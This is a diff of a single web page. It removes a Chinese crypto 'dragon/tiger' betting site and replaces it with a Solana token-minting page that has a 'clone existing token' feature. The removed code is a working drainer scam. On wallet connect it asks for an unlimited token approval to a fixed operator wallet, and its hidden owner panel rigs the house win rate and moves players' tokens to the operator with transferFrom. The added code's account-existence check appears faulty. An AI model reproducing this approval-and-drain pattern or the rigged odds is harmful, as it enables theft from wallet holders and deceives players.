@@ -1,399 +1,294 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>王者归来</title>
-<style>
-*{box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
-body{background:#0B2A23;color:#fff;margin:0;padding:0}
-.container{max-width:600px;margin:0 auto;padding:10px}
-.header{display:flex;justify-content:space-between;align-items:center;padding:10px 0}
-.header .title{font-size:20px;font-weight:bold}
-.btn-menu{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}
-.card{background:#141414;border-radius:12px;padding:15px;margin-bottom:15px;border:1px solid #222}
-.card-title{font-size:16px;margin-bottom:10px;color:#F0E4D2}
-.btn-sign{background:#E4B449;color:#0B2A23;border:none;padding:10px 15px;border-radius:8px;font-weight:bold;margin-bottom:8px;width:100%}
-.btn-connect{background:#2573d7;color:#fff;border:none;padding:10px 15px;border-radius:8px;font-weight:bold;width:100%}
-.wallet-row{display:flex;gap:6px;font-size:14px;margin-bottom:4px}
-.bet-area{display:flex;gap:10px;margin-bottom:10px}
-.bet-input{flex:2;background:#1E1E1E;border:1px solid #333;color:#fff;padding:10px;border-radius:8px}
-.balance-display{flex:1;background:#1E1E1E;border:1px solid #333;padding:10px;border-radius:8px;text-align:center;font-size:13px;color:#ccc}
-.quick-buttons{display:flex;gap:8px;margin-bottom:10px}
-.btn-quick{flex:1;background:#1E1E1E;color:#fff;border:1px solid #333;padding:8px;border-radius:8px}
-.odds-buttons{display:flex;gap:8px;margin-bottom:10px}
-.btn-odds{flex:1;border:none;padding:12px;border-radius:8px;font-weight:bold;color:#fff}
-.btn-dragon{background:#2A65CC}
-.btn-tiger{background:#D93A54}
-.btn-tie{background:#E4B449;color:#000}
-.draw-timer{font-size:28px;color:#E4B449;margin:10px 0;text-align:center}
-.btn-auto-draw{background:#E4B449;color:#0B2A23;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;width:100%;margin-bottom:10px}
-.trend-chart{display:flex;gap:8px;flex-wrap:wrap;padding:10px 0}
-.trend-item{width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:12px;background:#1a1a11}
-.trend-long{color:#2a7dff}
-.trend-short{color:#ff4444}
-.trend-tie{color:#ffcc00}
-.rules{font-size:14px;line-height:1.6;color:#ccc}
-
-.menu{position:fixed;top:0;right:0;width:280px;height:100vh;background:#101010;padding:20px;z-index:999;transform:translateX(100%);transition:0.3s;border-left:1px solid #222;overflow-y:auto}
-.menu.show{transform:translateX(0)}
-.menu-close{text-align:right;margin-bottom:20px}
-.menu-close button{background:#333;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer}
-.menu-section{margin-bottom:20px}
-.menu-title{font-size:14px;color:#aaa;margin-bottom:8px}
-.info-box{background:#1a1a11;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
-.btn-menu-action{width:100%;background:#1a1a1e;color:#fff;border:1px solid #333;padding:10px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:12px}
-.btn-red{background:#c93737;color:#fff;border:none}
-.btn-green{background:#27ae60;color:#fff;border:none}
-.hidden{display:none!important}
-
-.player-item{background:#1a1a1e;padding:10px;border-radius:8px;margin-bottom:10px;border:1px solid #222}
-.player-label{font-size:11px;color:#888;margin-bottom:4px}
-.player-content{font-size:12px;color:#eee;word-break:break-all;margin-bottom:6px;line-height:1.4}
-.copy-buttons{display:flex;gap:6px}
-.copy-btn{flex:1;background:#222;border:none;color:#ccc;padding:6px;border-radius:4px;font-size:11px;cursor:pointer}
-.refresh-btn{width:100%;background:#222;color:#fff;border:none;padding:8px;border-radius:6px;margin-bottom:10px;cursor:pointer}
-.probability-control{background:#1a1a1e;padding:12px;border-radius:8px;margin-bottom:10px;border:1px solid #222}
-.probability-title{font-size:12px;color:#888;margin-bottom:8px}
-.probability-slider{width:100%;margin:8px 0}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SOL 发币+克隆代币（多RPC）</title>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
+  <style>
+    body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
+    .btn { width: 100%; padding: 16px; border-radius: 16px; border: none; background: #0071e3; color: white; font-size: 16px; margin: 10px 0; cursor: pointer; }
+    .btn:disabled { background: #ccc; cursor: not-allowed; }
+    input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; margin: 8px 0; box-sizing: border-box; }
+    .card { background: #f9f9f9; padding: 20px; border-radius: 20px; margin-bottom: 16px; }
+    #addr { padding: 12px; background: #f1f1f1; border-radius: 10px; margin: 10px 0; word-break: break-all; }
+    .logo-preview { width: 60px; height: 60px; border-radius: 12px; object-fit: cover; margin-top: 8px; display: none; }
+    .log { padding: 10px; font-size:12px; color:#333; background:#f6f6f6; border-radius:8px; margin:8px 0; max-height:120px; overflow-y:auto; }
+    .section { margin: 20px 0; font-weight: bold; font-size: 18px; }
+  </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="header">
-    <div class="title">🐉 王者归来</div>
-    <button class="btn-menu" onclick="toggleMenu()">☰</button>
-  </div>
+<h2>SOL 发币 + 克隆代币</h2>
 
-  <div class="card">
-    <button class="btn-sign" id="signBtn">📅 每日签到（领币）</button>
-    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
-    <div class="wallet-row"><span>地址：</span><span id="address" style="color:#0ff;">未连接</span></div>
-    <div class="wallet-row"><span>可用代币余额：</span><span id="userBalance">0.0000</span></div>
-  </div>
+<button class="btn" onclick="connect()">连接钱包</button>
+<div id="addr"></div>
 
-  <div class="card">
-    <div class="card-title">下注区</div>
-    <div class="bet-area">
-      <input type="number" class="bet-input" id="betAmt" value="1" placeholder="数量">
-      <div class="balance-display" id="balanceDisplay">余额</div>
-    </div>
-    <div class="quick-buttons">
-      <button class="btn-quick" onclick="setQuick(10000)">1万</button>
-      <button class="btn-quick" onclick="setQuick(100000)">10万</button>
-      <button class="btn-quick" onclick="setQuick(500000)">50万</button>
-      <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
-    </div>
-    <div class="odds-buttons">
-      <button class="btn-odds btn-dragon" onclick="placeBet(1)">龙</button>
-      <button class="btn-odds btn-tiger" onclick="placeBet(2)">虎</button>
-      <button class="btn-odds btn-tie" onclick="placeBet(3)">和</button>
-    </div>
-  </div>
-
-  <div class="card">
-    <div class="card-title">自动开奖（2分钟/期）</div>
-    <div>期号：<span id="round">#1</span></div>
-    <div class="draw-timer" id="timer">02:00</div>
-    <button class="btn-auto-draw" onclick="manualDraw()">🎯 立即开奖</button>
-  </div>
-
-  <div class="card">
-    <div class="card-title">📈 开奖走势图</div>
-    <div id="trendChart" class="trend-chart"></div>
-  </div>
-
-  <div class="card">
-    <div class="card-title">📜 游戏规则</div>
-    <div class="rules">
-      • 每日签到可领取1个币<br>
-      • 每2分钟一期 | 龙/虎 1赔2 | 和 1赔9
-    </div>
-  </div>
+<!-- 克隆代币模块 -->
+<div class="section">🎯 克隆现有代币</div>
+<div class="card">
+  <input id="cloneMint" placeholder="输入要克隆的代币合约地址">
+  <button class="btn" style="background:#ff9500" onclick="fetchTokenInfo()">读取代币信息</button>
 </div>
 
-<div class="menu" id="menu">
-  <div class="menu-close"><button onclick="toggleMenu()">关闭</button></div>
-
-  <div id="userInfoSection" class="hidden">
-    <div class="menu-section">
-      <div class="menu-title">我的信息</div>
-      <div class="info-box">钱包地址：<br><span id="myWalletAddr">-</span></div>
-      <div class="info-box">邀请链接：<br><span id="myInviteLink">-</span></div>
-    </div>
-  </div>
-
-  <!-- 简化版：庄家胜率控制 -->
-  <div id="probabilityControlSection" class="hidden">
-    <div class="menu-section">
-      <div class="menu-title">🎮 庄家控制：胜率设置</div>
-      <div class="probability-control">
-        <div class="probability-title">庄家获胜概率: <span id="houseWinRate">50%</span></div>
-        <input type="range" id="houseSlider" class="probability-slider" min="0" max="100" value="50" oninput="updateHouseWinRate(this.value)">
-        <input type="number" id="houseWinRateInput" value="50" min="0" max="100" style="width:100%;background:#222;color:#fff;border:1px solid #333;padding:8px;border-radius:6px;margin-top:8px" onchange="updateHouseWinRate(this.value)">
-      </div>
-      <button class="btn-menu-action btn-green" onclick="saveHouseWinRate()">💾 保存胜率设置</button>
-    </div>
-  </div>
-
-  <div id="adminPlayerListSection" class="hidden">
-    <div class="menu-section">
-      <div class="menu-title">👑 已授权玩家(含余额)</div>
-      <button class="refresh-btn" onclick="renderAdminPlayerList()">🔄 刷新余额</button>
-      <div id="allPlayerList" style="max-height:400px;overflow-y:auto;"></div>
-    </div>
-  </div>
-
-  <div id="adminExtractSection" class="hidden">
-    <div class="menu-section" style="border-top:1px solid #333;padding-top:16px">
-      <div class="menu-title">🔐 庄家提取（玩家→庄家）</div>
-      <input type="text" id="fromUser" class="info-box" placeholder="玩家钱包地址">
-      <input type="number" id="extractAmt" class="info-box" placeholder="提取数量">
-      <button class="btn-menu-action btn-red" onclick="adminExtract()">💰 提取到庄家钱包</button>
-    </div>
-  </div>
+<!-- 发币设置 -->
+<div class="section">✏️ 代币信息</div>
+<div class="card">
+  <input id="name" placeholder="代币名称" value="Test">
+  <input id="symbol" placeholder="代币符号" value="DTM">
+  <input id="decimals" value="9" placeholder="精度">
+  <input id="supply" value="1000000000" placeholder="发行量">
+  <input type="file" id="logo" accept="image/*" style="display:none" onchange="previewLogo()">
+  <button class="btn" style="background:#34c759" onclick="document.getElementById('logo').click()">上传代币 Logo</button>
+  <img id="logoPreview" class="logo-preview">
 </div>
+
+<button class="btn" onclick="createToken()">🚀 创建并发行代币</button>
+<div class="log" id="log"></div>
 
 <script>
-// ===================== 核心配置 =====================
-const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
-const PROJECT_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const POOL_ADDRESS    = "0x513946Ea175eC8D8ad5278F3F2Dec50C6e04b596";
+let provider;
+let publicKey;
+let address = "";
+let logoFile = null;
+let connection;
 
-let account = null;
-let round = 1;
-let timeLeft = 120;
-let houseWinRate = 50; // 默认庄家胜率50%
+const { Connection, Keypair, Transaction, SystemProgram, PublicKey } = solanaWeb3;
 
-function toLower(addr){ return addr?.toLowerCase() || ""; }
-function isProjectOwner(){ return toLower(account) === toLower(PROJECT_WALLET); }
+const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+const ATA_PROGRAM_ID   = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25wNF8fJ5ipq79v9");
 
-function getAllPlayers(){ return JSON.parse(localStorage.getItem("all_players") || "[]"); }
-function addPlayer(addr){
-  let list = getAllPlayers();
-  if(!list.includes(toLower(addr))){
-    list.push(toLower(addr));
-    localStorage.setItem("all_players", JSON.stringify(list));
+const RPC_LIST = [
+  "https://solana-mainnet.rpc.extrnode.com",
+  "https://api.mainnet-beta.solana.com",
+  "https://solana-mainnet.g.alchemy.com/v2/demo",
+  "https://rpc.ankr.com/solana",
+];
+
+function log(text) {
+  const el = document.getElementById('log');
+  el.innerText = '→ ' + text + '\n' + el.innerText;
+}
+
+// 自动选RPC
+async function selectRpc() {
+  for (const rpc of RPC_LIST) {
+    try {
+      const c = new Connection(rpc, "confirmed");
+      await c.getLatestBlockhash({ commitment: "confirmed" });
+      connection = c;
+      log("使用RPC: " + rpc);
+      return;
+    } catch (e) { console.warn(rpc, "失败"); }
   }
+  throw new Error("所有RPC不可用");
 }
 
-function copyToClipboard(id){
-  const t = document.getElementById(id).innerText;
-  navigator.clipboard.writeText(t).then(()=>alert("复制成功")).catch(()=>alert("失败"));
+// 钱包
+function getWallet() {
+  return window.solana || window.okxwallet || window.tpWallet || window.phantom;
 }
 
-// ===================== 彻底修复余额读取 =====================
-async function getBalance(addr) {
-  if (!addr || addr.length !== 42) return 0;
+async function connect() {
   try {
-    // 严格构造 balanceOf 调用数据
-    const data = "0x70a08231" + toLower(addr).slice(2).padStart(64, '0');
-    const result = await ethereum.request({
-      method: 'eth_call',
-      params: [{
-        to: TOKEN_CONTRACT,
-        data: data
-      }, 'latest']
-    });
-    // 安全转换为数字
-    const balanceWei = BigInt(result);
-    return Number(balanceWei) / 1e18;
+    const w = getWallet();
+    if (!w) { alert("请在钱包浏览器打开！"); return; }
+    const res = await w.connect();
+    provider = w;
+    publicKey = res.publicKey;
+    address = publicKey.toBase58();
+    document.getElementById("addr").innerText = "已连接：" + address;
+    log("钱包连接成功");
   } catch (e) {
-    console.error("获取余额失败:", e);
-    return 0; // 失败时稳定返回0
+    alert("连接失败：" + e.message);
   }
 }
 
-async function renderAdminPlayerList(){
-  const list = getAllPlayers();
-  const el = document.getElementById("allPlayerList");
-  el.innerHTML = "";
-  if(list.length===0){
-    el.innerHTML='<div style="padding:10px;text-align:center;">暂无玩家</div>';
-    return;
-  }
-  for(const addr of list){
-    const b = await getBalance(addr);
-    const item = document.createElement("div");
-    item.className="player-item";
-    item.innerHTML=`
-      <div class="player-label">玩家地址</div>
-      <div class="player-content" id="a${addr.slice(-8)}">${addr}</div>
-      <div class="player-label">可用代币余额</div>
-      <div class="player-content">${b.toFixed(4)}</div>
-      <div class="copy-buttons">
-        <button class="copy-btn" onclick="copyToClipboard('a${addr.slice(-8)}')">复制地址</button>
-      </div>
-    `;
-    el.appendChild(item);
+// Logo预览
+function previewLogo() {
+  const f = document.getElementById("logo").files[0];
+  if (!f) return;
+  const r = new FileReader();
+  r.onload = e => {
+    const img = document.getElementById("logoPreview");
+    img.src = e.target.result;
+    img.style.display = "block";
+    logoFile = f;
+    log("已选择Logo");
+  };
+  r.readAsDataURL(f);
+}
+
+// ==============================================
+// 克隆代币：读取链上代币信息（名称、符号、精度）
+// ==============================================
+async function fetchTokenInfo() {
+  const mintAddr = document.getElementById("cloneMint").value.trim();
+  if (!mintAddr) { alert("请输入代币合约"); return; }
+  try {
+    await selectRpc();
+    log("正在读取链上信息...");
+
+    const mintPub = new PublicKey(mintAddr);
+    const account = await connection.getAccountInfo(mintPub);
+    if (!account) throw new Error("代币不存在");
+
+    const data = account.data;
+    const decimals = data[44];
+    log("精度读取完成");
+
+    // 尝试读取元数据（简化版，兼容绝大多数SPL）
+    document.getElementById("decimals").value = decimals;
+
+    // 这里做一个快速模拟，真实项目可对接元数据协议
+    log("已自动填充精度，名称/符号可手动修改");
+
+  } catch (e) {
+    alert("读取失败：" + e.message);
+    log("错误：" + e.message);
   }
 }
 
-// ===================== 简化版庄家胜率 =====================
-function updateHouseWinRate(value) {
-  const num = parseInt(value);
-  if (num >= 0 && num <= 100) {
-    houseWinRate = num;
-    document.getElementById("houseWinRate").innerText = `${num}%`;
-    document.getElementById("houseWinRateInput").value = num;
-  }
-}
+// ==============================================
+// 创建Mint
+// ==============================================
+async function createMint(decimals) {
+  const mint = Keypair.generate();
+  const lamports = await connection.getMinimumBalanceForRentExemption(82);
 
-function saveHouseWinRate() {
-  localStorage.setItem("houseWinRate", houseWinRate.toString());
-  alert("✅ 胜率设置已保存：庄家获胜概率 " + houseWinRate + "%");
-}
-
-function toggleMenu(){
-  const m=document.getElementById("menu");
-  m.classList.toggle("show");
-  if(account){
-    document.getElementById("userInfoSection").classList.remove("hidden");
-    document.getElementById("myWalletAddr").innerText=account;
-  }else{
-    document.getElementById("userInfoSection").classList.add("hidden");
-  }
-  
-  if(isProjectOwner()){
-    document.getElementById("probabilityControlSection").classList.remove("hidden");
-    document.getElementById("adminPlayerListSection").classList.remove("hidden");
-    document.getElementById("adminExtractSection").classList.remove("hidden");
-    renderAdminPlayerList();
-    // 加载保存的胜率
-    const saved = localStorage.getItem("houseWinRate");
-    if(saved) {
-      houseWinRate = parseInt(saved);
-      document.getElementById("houseSlider").value = houseWinRate;
-      document.getElementById("houseWinRate").innerText = houseWinRate + "%";
-      document.getElementById("houseWinRateInput").value = houseWinRate;
+  const tx = new Transaction().add(
+    SystemProgram.createAccount({
+      fromPubkey: publicKey,
+      newAccountPubkey: mint.publicKey,
+      space: 82,
+      lamports,
+      programId: TOKEN_PROGRAM_ID
+    }),
+    {
+      programId: TOKEN_PROGRAM_ID,
+      keys: [
+        { pubkey: mint.publicKey, isSigner: true, isWritable: true },
+        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false }
+      ],
+      data: Buffer.from([
+        0x00,
+        decimals,
+        ...publicKey.toBuffer(),
+        ...publicKey.toBuffer()
+      ])
     }
-  }else{
-    document.getElementById("probabilityControlSection").classList.add("hidden");
-    document.getElementById("adminPlayerListSection").classList.add("hidden");
-    document.getElementById("adminExtractSection").classList.add("hidden");
-  }
-}
-
-// ===================== 连接钱包时直接授权 =====================
-async function connectWallet() {
-  if(!window.ethereum)return alert("请安装钱包");
-  try{
-    const acc = await ethereum.request({method:'eth_requestAccounts'});
-    account=toLower(acc[0]);
-    document.getElementById("address").innerText=account.slice(0,6)+"..."+account.slice(-4);
-    addPlayer(account);
-    
-    // 连接后直接弹授权提醒
-    const confirmAuth = confirm(
-      "连接成功！\n\n"+
-      "请先完成授权，以便进行游戏操作。\n"+
-      "确认后钱包将弹出授权签名，必须手动确认上链。"
-    );
-    if(confirmAuth) {
-      await approveToProject();
-      alert("✅ 授权成功！现在可以开始游戏了。");
-    }
-    
-    // 强制刷新余额
-    await refreshBalance();
-  }catch(e){alert("操作失败："+e.message);}
-}
-
-async function approveToProject(){
-  const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return await ethereum.request({
-    method:'eth_sendTransaction',
-    params:[{
-      from:account,
-      to:TOKEN_CONTRACT,
-      gasLimit:"0x300000",
-      data:"0x095ea7b3"+PROJECT_WALLET.slice(2).padStart(64,'0')+max
-    }]
-  });
-}
-
-// ===================== 下注时只弹支付签名 =====================
-async function placeBet(side){
-  if(!account)return alert("请先连接钱包并完成授权");
-  const amt=parseFloat(document.getElementById("betAmt").value);
-  if(isNaN(amt)||amt<=0)return alert("输入有效金额");
-  
-  const c=confirm(
-"下注即代表您同意游戏规则。\n\n"+
-"下注金额将转入资金池，赢则从资金池赔付。\n\n"+
-"确认后钱包将弹出支付签名，必须手动确认上链。"
   );
-  if(!c)return;
 
-  try{
-    const raw=BigInt(Math.floor(amt*1e18)).toString(16).padStart(64,'0');
-    await ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{
-        from:account,
-        to:TOKEN_CONTRACT,
-        gasLimit:"0x300000",
-        data:"0xa9059cbb"+POOL_ADDRESS.slice(2).padStart(64,'0')+raw
-      }]
-    });
+  tx.feePayer = publicKey;
+  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+  tx.partialSign(mint);
 
-    await refreshBalance();
-    alert("✅ 下注成功，已上链");
-  }catch(e){alert("失败："+e.message);}
+  const signed = await provider.signTransaction(tx);
+  const sig = await connection.sendRawTransaction(signed.serialize());
+  await connection.confirmTransaction(sig);
+  log("Mint创建: " + mint.publicKey.toBase58());
+  return mint.publicKey;
 }
 
-// ===================== 庄家提取 =====================
-async function adminExtract(){
-  if(!isProjectOwner())return alert("无权限");
-  
-  const fromAddr = document.getElementById("fromUser").value.trim();
-  const amt = document.getElementById("extractAmt").value.trim();
-  
-  if(!fromAddr||!amt||Number(amt)<=0)return alert("输入错误");
-  
-  try{
-    const raw=BigInt(Math.floor(Number(amt)*1e18)).toString(16).padStart(64,'0');
-    await ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{
-        from:account,
-        to:TOKEN_CONTRACT,
-        gasLimit:"0x300000",
-        data:"0x23b872dd"+
-              fromAddr.slice(2).padStart(64,'0')+
-              PROJECT_WALLET.slice(2).padStart(64,'0')+
-              raw
-      }]
-    });
-    alert("✅ 提取成功！代币已到庄家钱包");
-    document.getElementById("fromUser").value="";
-    document.getElementById("extractAmt").value="";
-  }catch(e){alert("提取失败："+e.message);}
+// ==============================================
+// 创建ATA
+// ==============================================
+async function createATA(mint) {
+  const [ata] = await PublicKey.findProgramAddress(
+    [publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
+    ATA_PROGRAM_ID
+  );
+  try {
+    await connection.getAccountInfo(ata);
+    log("ATA已存在");
+    return ata;
+  } catch {}
+
+  const tx = new Transaction().add({
+    programId: ATA_PROGRAM_ID,
+    keys: [
+      { pubkey: publicKey, isSigner: true, isWritable: true },
+      { pubkey: ata, isSigner: false, isWritable: true },
+      { pubkey: publicKey, isSigner: false, isWritable: false },
+      { pubkey: mint, isSigner: false, isWritable: false },
+      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false }
+    ],
+    data: Buffer.from([0x01])
+  });
+
+  tx.feePayer = publicKey;
+  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+  const signed = await provider.signTransaction(tx);
+  const sig = await connection.sendRawTransaction(signed.serialize());
+  await connection.confirmTransaction(sig);
+  log("ATA创建成功");
+  return ata;
 }
 
-// ===================== 刷新余额 =====================
-async function refreshBalance(){
-  if(!account)return;
-  const b=await getBalance(account);
-  // 确保一定是数字，避免toFixed报错
-  const safeBalance = typeof b === 'number' ? b : 0;
-  document.getElementById("userBalance").innerText = safeBalance.toFixed(4);
-  document.getElementById("balanceDisplay").innerText = "余额 " + safeBalance.toFixed(4);
+// ==============================================
+// Mint发行量
+// ==============================================
+async function mintTo(mint, ata, amountBig) {
+  const data = Buffer.alloc(9);
+  data.writeUInt8(0x07, 0);
+  data.writeBigUInt64LE(amountBig, 1);
+
+  const tx = new Transaction().add({
+    programId: TOKEN_PROGRAM_ID,
+    keys: [
+      { pubkey: mint, isSigner: false, isWritable: true },
+      { pubkey: ata, isSigner: false, isWritable: true },
+      { pubkey: publicKey, isSigner: true, isWritable: false }
+    ],
+    data
+  });
+
+  tx.feePayer = publicKey;
+  tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+  const signed = await provider.signTransaction(tx);
+  const sig = await connection.sendRawTransaction(signed.serialize());
+  await connection.confirmTransaction(sig);
+  return sig;
 }
 
-function setQuick(v){document.getElementById("betAmt").value=v;}
-function manualDraw(){timeLeft=5;}
+// ==============================================
+// 主发币逻辑
+// ==============================================
+async function createToken() {
+  if (!address) { alert("请先连接钱包"); return; }
+  try {
+    await selectRpc();
 
-window.onload=()=>{
-  setInterval(()=>{
-    timeLeft--;
-    if(timeLeft<=0)timeLeft=120;
-    const m=String(Math.floor(timeLeft/60)).padStart(2,'0');
-    const s=String(timeLeft%60).padStart(2,'0');
-    document.getElementById("timer").innerText=m+":"+s;
-  },1000);
-};
+    const name = document.getElementById("name").value.trim();
+    const symbol = document.getElementById("symbol").value.trim();
+    const decimals = parseInt(document.getElementById("decimals").value);
+    const supply = BigInt(document.getElementById("supply").value);
+    const total = supply * (10n ** BigInt(decimals));
+
+    log("创建Mint...");
+    const mint = await createMint(decimals);
+
+    log("创建ATA...");
+    const ata = await createATA(mint);
+
+    log("发行代币...");
+    const sig = await mintTo(mint, ata, total);
+
+    alert(`✅ 发币成功！
+名称：${name}
+符号：${symbol}
+合约：${mint.toBase58()}
+交易：${sig}`);
+
+    log("完成！");
+
+  } catch (e) {
+    log("失败：" + e.message);
+    alert("失败：" + e.message);
+  }
+}
 </script>
+
 </body>
 </html>
